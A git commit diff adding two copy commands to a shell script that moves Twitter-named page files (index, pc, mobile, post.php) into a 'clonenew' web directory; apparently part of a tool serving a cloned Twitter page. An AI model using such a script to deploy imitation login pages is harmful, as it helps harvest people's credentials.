97f2c50bc95edccf83d18338bfcbc642d8e31573
mak <makindosx@gmail.com>
2017-11-29 19:55:39 +0200

    Add files via upload

--- shell/twitter.sh
+++ shell/twitter.sh
@@ -1,3 +1,5 @@
 cp -avr /var/www/clonenew/twitter/index.html /var/www/clonenew/
+cp -avr /var/www/clonenew/twitter/pc.html /var/www/clonenew/
+cp -avr /var/www/clonenew/twitter/mobile.html /var/www/clonenew/
 cp -avr /var/www/clonenew/twitter/post.php /var/www/clonenew/
 
